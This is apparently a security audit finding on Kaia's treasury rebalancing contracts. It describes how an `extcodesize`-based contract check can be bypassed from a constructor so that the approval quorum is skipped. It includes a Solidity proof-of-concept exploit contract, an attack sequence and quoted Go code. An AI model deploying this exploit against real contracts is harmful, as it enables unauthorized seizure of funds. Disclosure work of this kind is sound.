### Title
`isContractAddr` Constructor Bypass Allows Unauthorized Treasury Rebalancing Approval — (`contracts/testing/system_contracts/TreasuryRebalance.sol`, `contracts/testing/system_contracts/TreasuryRebalanceV2.sol`)

---

### Summary

Both `TreasuryRebalance.sol` (KIP-103) and `TreasuryRebalanceV2.sol` (KIP-160) use an `isContractAddr()` helper that relies on `extcodesize`. This opcode returns `0` for a contract that is currently executing its constructor, making the check bypassable. The `approve()` function branches on this result to choose between EOA-path and contract-path authorization. A malicious contract can call `approve(self)` from its constructor, take the EOA path (which only requires `msg.sender == _retiredAddress`), record a single self-approval, then self-destruct. When `checkRetiredsApproved()` later re-evaluates `isContractAddr`, the self-destructed address again reads as an EOA, and the EOA path only asserts `approvers.length == 1` — without verifying the approver's identity — so the quorum check is fully bypassed. The Go layer in `blockchain/system/rebalance.go` then executes the rebalancing unconditionally, zeroing out the retired address's KAIA balance and distributing funds to the allocated addresses.

---

### Finding Description

**Vulnerable helper (identical in both contracts):**

function isContractAddr(address _addr) public view returns (bool) {
    uint256 size;
    assembly { size := extcodesize(_addr) }
    return size > 0;
}

---

### Impact Explanation

The treasury rebalancing (KIP-103 / KIP-160) is a privileged operation that zeroes out the KAIA balance of registered "retired/zeroed" addresses and redistributes those funds to "allocated/newbie" addresses. The approval mechanism is the only on-chain consent gate protecting the fund holders. Bypassing it allows the rebalancing to proceed without the required quorum of multisig admins signing off, resulting in:

- **Unauthorized burn/redistribution of KAIA** held in the retired address — `state.SetBalance(addr, big.NewInt(0))` is called unconditionally once `CheckZeroedsApproved` passes.
- **Unauthorized minting/allocation** to attacker-controlled allocated addresses.

This matches the allowed impact gate: *unauthorized transfer, burn, or reward distribution affecting KAIA or system-managed funds*.

---

### Likelihood Explanation

Prerequisites:
1. The owner must register a pre-computed CREATE2 address as a retired/zeroed address. An attacker can present a plausible-looking address to the owner before deploying the contract there.
2. The attacker must deploy the malicious contract at that address during the `Registered` phase (between `finalizeRegistration()` and `finalizeApproval()`).
3. The contract must self-destruct after self-approving so that `checkRetiredsApproved()` also takes the EOA path.

The owner registration requirement is a significant prerequisite, making this a semi-trusted-trigger scenario (the attacker must influence the owner). Likelihood is low-to-medium, but the impact is critical.

---

### Recommendation

Replace the `extcodesize`-based `isContractAddr` with a persistent flag set at registration time. When `registerRetired` / `registerZeroed` is called, record whether the address currently has code:

```solidity
struct Retired {
    address retired;
    address[] approvers;
    bool isContract; // set once at registration, immutable
}
```

Alternatively, require the retired address to explicitly call `approve()` only after the contract is fully deployed (enforce a block-number gap between registration and approval), or use `tx.origin != msg.sender` as an additional signal. The simplest fix matching the CoreDAO resolution is to remove the EOA/contract distinction entirely and require all approvals to come from a pre-registered admin list.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.19;

interface ITreasuryRebalance {
    function approve(address _retiredAddress) external;
}

contract BypassApproval {
    constructor(address _treasuryRebalance, address _self) {
        // During construction: extcodesize(address(this)) == 0
        // isContractAddr(address(this)) returns false → EOA path taken
        // msg.sender == address(this) == _retiredAddress → passes
        ITreasuryRebalance(_treasuryRebalance).approve(_self);
        // Self-destruct so checkRetiredsApproved() also sees extcodesize == 0
        selfdestruct(payable(msg.sender));
    }
}
```

**Attack sequence:**

1. Attacker pre-computes `X = CREATE2(factory, salt, bytecode_of_BypassApproval)`.
2. Owner is convinced to call `registerRetired(X)` / `registerZeroed(X)` and then `finalizeRegistration()`.
3. Attacker deploys `BypassApproval` at `X` via CREATE2. Constructor calls `approve(X)` → EOA path → 1 approval recorded. Contract self-destructs.
4. Owner calls `finalizeApproval()` → `checkRetiredsApproved()` → `isContractAddr(X) == 0` (self-destructed) → EOA path → `approvers.length == 1` → **passes**.
5. Go layer (`RebalanceTreasury`) executes at the hard-fork block: `state.SetBalance(X, 0)` zeroes `X`'s KAIA balance; allocated addresses receive funds — all without legitimate multisig quorum consent. [8](#0-7) [9](#0-8) [10](#0-9)

```go
func RebalanceTreasury(state *state.StateDB, chain backends.BlockChainForCaller, header *types.Header) (*rebalanceResult, error) {
	var (
		err    error
		caller RebalanceCaller

		result   = newRebalanceReceipt()
		isKIP160 = chain.Config().IsKIP160ForkBlock(header.Number)
		isKIP103 = chain.Config().IsKIP103ForkBlock(header.Number)
	)

	if isKIP160 {
		caller, err = rebalance.NewTreasuryRebalanceV2Caller(chain.Config().Kip160ContractAddress, backends.NewBlockchainContractBackend(chain, nil, nil))
	} else if isKIP103 {
		caller, err = NewKip103ContractCaller(state, chain, header)
	} else {
		return nil, errors.New("rebalancing shouldn't be executed unless the block number is kip103 or kip160 hard fork")
	}
	if err != nil {
		return nil, err
	}

	// Retrieve 1) Get Zeroed
	if err = result.fillZeroed(caller, state); err != nil {
		return result, err
	}

	// Retrieve 2) Get Allocated
	if err = result.fillAllocated(caller, state); err != nil {
		return result, err
	}

	// Validation 1) Check the target block number
	if blockNum, err := caller.RebalanceBlockNumber(nil); err != nil || blockNum.Cmp(header.Number) != 0 {
		return result, ErrRebalanceIncorrectBlock
	}

	// Validation 2) Check whether status is approved. It should be 2 meaning approved
	if status, err := caller.Status(nil); err != nil || status != 2 {
		return result, ErrRebalanceBadStatus
	}

	// Validation 3) Check approvals from zeroeds
	if err = caller.CheckZeroedsApproved(nil); err != nil {
		return result, err
	}

	// Validation 4) Check the total balance of zeroeds are bigger than the distributing amount
	totalZeroedAmount := result.totalZeroedBalance()
	totalAllocatedAmount := result.totalAllocatedBalance()
	if isKIP103 && totalZeroedAmount.Cmp(totalAllocatedAmount) < 0 {
		return result, ErrRebalanceNotEnoughBalance
	}

	// Execution 1) Clear all balances of zeroeds
	for addr := range result.Before.Zeroed {
		state.SetBalance(addr, big.NewInt(0))
		result.After.Zeroed[addr] = big.NewInt(0)
	}
	// Execution 2) Distribute KAIA to all allocateds
	for addr, balance := range result.After.Allocated {
		// if an allocated has KAIA before the allocation, it will be burnt
		currentBalance := state.GetBalance(addr)
		result.Burnt.Add(result.Burnt, currentBalance)

		state.SetBalance(addr, balance)
	}

	// Fill the remaining fields of the result
	remainder := new(big.Int).Sub(totalZeroedAmount, totalAllocatedAmount)
	result.Burnt.Add(result.Burnt, remainder)
	result.Success = true
	return result, nil
```
